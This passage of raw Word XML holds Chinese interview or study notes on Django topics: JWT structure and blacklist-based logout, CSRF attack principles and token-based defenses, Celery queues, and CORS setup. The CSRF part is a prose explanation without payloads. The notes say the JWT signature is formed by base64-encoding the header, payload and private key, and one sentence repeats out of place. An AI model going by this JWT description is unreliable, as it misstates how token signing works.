    <w:p w14:paraId="7BFB18F4" w14:textId="77777777" w:rsidR="00D8288D"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2）载荷(payload)：保存有效的数据，通常还包含token的有效时间，使用base64编码生成字符串。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B1906C" w14:textId="740B990A" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>3）签名(signature)：防止jwt token被伪造，由服务器在生成jwt token时，将header和payload内容拼接用</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>隔开，然后使用密钥加密生成。 签名有三部分组成，包括把头部、载荷、私钥（私钥是django项目一创建出来就出现在配置文件里的）再用base64编码，构成最终的jwt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFE716C" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="001D56F9">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Style w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F9F2F4"/>
        </w:rPr>
        <w:t>jwt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F9F2F4"/>
        </w:rPr>
        <w:t>认证的特点和使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0252358C" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1）jwt token由服务器生成，交给客户端进行存储，不占用服务器的存储空间；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DCF256" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2）适合于分布式站点的应用场景。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054982BF" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3）使用时payload中不要存储敏感信息，因为这部分内容很容易被客户端解码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70299806" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4）服务器端的密钥需要保存好，泄露密钥之后jwt token数据可以被随意伪造。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BA18B1" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们保存jwt,token在浏览器本地存储中,返回给前端，前端保存token。私钥是django项目一创建出来就出现在配置文件里的）再用base64编码，构成最终的jwt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C51F12E" w14:textId="77777777"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修改密码怎样退出登录：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9E31FF" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>做一个判断，看密码是否修改，修改的话就把taken加入黑名单。每次都检验黑名单。先判断是否存在黑名单里，如果存在，就退出登录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F0FDFE" w14:textId="77777777"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jwt注销登录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394CEADE" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>jwt最大的问题就在于后台没有存储用户状态，用户退出的话只是客户端删掉了token，然而此token在有效期内还是有效的。那么最麻烦的就是怎么让一个token在用户注销后失效，以及后台强制退出，这个jwt是没办法的，因为jwt的无状态和用户状态维护是个矛盾冲突的话题。如果要解决就要建立一个黑名单，也就是把用户注销后的token放到redis里，然后每次校验黑名单（这里还是用到了数据库）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DB0836" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A2037A">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说出CSRF 攻击的原理和防范措施</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772A66B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>a)攻击原理：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E29AF2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>i.用户C访问正常网站A时进行登录，浏览器保存A的cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE950EB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ii.用户C再访问攻击网站B，网站B上有某个隐藏的链接或者图片标签会自动请求网站A的URL地址,例如表单提交，传指定的参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051E022C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>iii.而攻击网站B在访问网站A的时候，浏览器会自动带上网站A的cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD6D6FC" w14:textId="1AD1FE85" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>iv.所以网站A在接收到请求之后可判断当前用户是登录状态，所以根据用户的权限做具体的操作逻辑，造成网站攻击成功</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B703C5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>b)防范措施：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0C3A42" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>i.在请求头的里面添加一个随机值做为参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A58B88" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ii.在响应的cookie里面也设置该随机值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC2E634" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>iii.那么用户C在正常提交表单的时候会默认带上表单中的随机值，浏览器会自动带上cookie里面的随机值，那么服务器下次接受到请求之后就可以取出两个值进行校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4333DD56" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>iv.而对于网站B来说网站B在提交表单的时候不知道该随机值是什么，所以就形成不了攻击</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C025371" w14:textId="02063535" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>也可以用来设置避免表单的重复提交</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1DDE1D" w14:textId="14640D5C" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00412F97" w:rsidP="00A63022">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010</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 xml:space="preserve">Celery </w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>分布式任务队列？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30480459" w14:textId="7DDF0C25" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>情景：用户发起request，并等待response返回。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E5BEF3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在本些views中，可能需要执行一段耗时的程序，那么用户就会等待很长时间，造成不好的用户体验，比如发送邮件、手机验证码等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5413DC79" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用 celery 后，情况就不一样了。解决：将耗时的程序放到 celery 中执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55DB8C31" w14:textId="60DB31D7" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>将多个耗时的任务添加到队列 queue 中，也就是用 redis 实现 broker 中间人，然后用多个 worker 去监听队列里的任务去执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="629E270A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>celery通过消息进行通信，通常使用一个叫Broker(中间人)来协client(任务的发出者)和worker(任务的处理者). clients发出消息到队列中，broker将队列中的信息派发给worker来处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E819C7D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>任务队列是一种跨线程、跨机器工作的一种机制.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684C9268" w14:textId="18FDDFDB" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>celery保存在redis里面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C998F93" w14:textId="601EEF3D" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00412F97" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>011</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>怎么实现跨域</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC4ED17" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>安装</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F5A8DB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pip install django-cors-headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D17D50E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>添加应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F682077" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>INSTALLED_APPS = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59798F44" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD2913E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>‘corsheaders’,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326FC412" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A25D48B" w14:textId="621A9FC2" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18939430" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
